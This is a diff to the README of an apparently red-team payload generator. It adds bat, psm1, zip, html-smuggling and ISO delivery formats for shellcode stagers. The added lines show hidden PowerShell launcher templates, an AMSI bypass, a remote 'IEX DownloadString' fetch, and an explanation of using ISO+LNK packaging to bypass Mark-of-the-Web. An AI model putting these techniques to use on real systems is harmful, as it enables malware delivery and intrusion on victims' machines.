@@ -27,7 +27,7 @@ C header). A local web console drives the same pipeline from a browser.
   activated by their matching evasion layer (`-e unhook` / `-e dynamic-api`).
 - ✅ 11 evasion layers implemented (all, including `sleep` tier-1 memory-encrypt-during-sleep and tier-2 Ekko/Foliage timer-driven self-modifying sleep)
 - ✅ 3 implant formats: `exe` (pure Go), `dll` (c-shared, CGO+mingw), `c` (C header export)
-- ✅ 11 delivery formats: `raw`, `lnk`, `hta`, `sct`, `vba`, `vbs`, `wsf`, `ps1`, `xsl`, `js`, `jse` (inline embed + `--url` remote fetch)
+- ✅ 16 delivery formats: `raw`, `lnk`, `hta`, `sct`, `vba`, `vbs`, `wsf`, `ps1`, `xsl`, `js`, `jse`, `bat`, `psm1`, `zip`, `html`, `iso` (inline embed + `--url` remote fetch; `zip`/`iso` are combine formats that package a `.lnk` + `.bat`)
 - ✅ Pluggable C2 provider framework — Sliver + Metasploit (msfvenom) + donut + msfrpc (live msfrpcd) today, open for Mythic/Havoc/BRc
 - ✅ Local web console (`shroud web`) — catalog + generate/deliver forms + C2 + artifact download, sharing one generate/deliver implementation with the CLI via `internal/ops`
 - ✅ garble OPSC build path
@@ -231,6 +231,11 @@ the implant formats. The technique `<id>` is **optional** for delivery formats a
 | `vbs` | `.vbs` | VBScript `WScript.Shell.Run "powershell -enc …", 0, False` | LOLBin fetch | `cscript //nologo payload.vbs` |
 | `wsf` | `.wsf` | WSF XML wrapper + JScript `WScript.Shell.Run` | LOLBin fetch | `cscript //nologo payload.wsf` |
 | `lnk` | `.lnk` | `cmd.exe /c powershell -enc <stager>` | target per `--launcher` | double-click the shortcut |
+| `bat` | `.bat` | `@echo off` + `powershell -NoP -NoLogo -w hidden -enc <stager>` | LOLBin fetch | double-click / `cmd /c payload.bat` |
+| `psm1` | `.psm1` | AMSI-bypass + base64-decode + VirtualAlloc/CreateThread stager | `IEX (DownloadString url)` | `Import-Module .\payload.psm1` (top-level code runs on import) |
+| `zip` | `.zip` | packages a `.lnk` + `.bat` (same shellcode) via `archive/zip` | same (inner `.lnk`/`.bat` carry the url) | extract + double-click (no MOTW bypass) |
+| `html` | `.html` | HTML smuggling: base64-embedded `.bat` → JS `Blob` auto-download | n/a (inline-only) | open in a browser → downloads `payload.bat` → run it |
+| `iso` | `.iso` | minimal ISO 9660 image packaging a `.lnk` + `.bat` (same shellcode) | same (inner `.lnk`/`.bat` carry the url) | mount the ISO + double-click `PAYLOAD.LNK` (MOTW bypass) |
 
 **Two delivery modes** (mutually exclusive):
 
@@ -271,6 +276,20 @@ msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o sc.bin
 > if a generated file does not run on the engagement target, fall back to `-f hta`,
 > `-f js`, `-f vbs`, or `-f wsf` (plaintext script wrappers) — see the per-format
 > notes above. `.vbs` and `.wsf` are the simplest `cscript`-run plaintext fallbacks.
+
+> **Combine formats (`zip`, `iso`) + MOTW.** Both package the *same* inner `.lnk`
+> + `.bat` (built by delegating to those emitters — no stager duplication) so the
+> target gets a double-click shortcut and a runnable dropper in one file. `zip` is
+> a phishing-bundle convenience; it does **not** bypass Mark-of-the-Web (extracted
+> files inherit MOTW). `iso` does: mounting an ISO on Windows does not propagate
+> MOTW to the mounted files, so the `.lnk`/`.bat` inside run without SmartScreen
+> friction (a current 2022+ delivery primitive; the BazarLoader/Qakbot ISO+LNK
+> pattern). The ISO writer is a minimal pure-Go single-session ISO 9660 builder
+> (no Joliet/Rock Ridge, 8.3 uppercase `;1` names); structurally verified in-Go
+> (PVD parse-back) and with `7z`. **Windows mount + execution is the final
+> verification** — if a generated `.iso` does not mount on the target, fall back
+> to `-f zip`. `html` is inline-only (a browser sandbox cannot fetch+exec a
+> remote stage-2); for remote delivery use `bat`/`lnk`/`sct` with `--url`.
 
 ## C2 providers
 
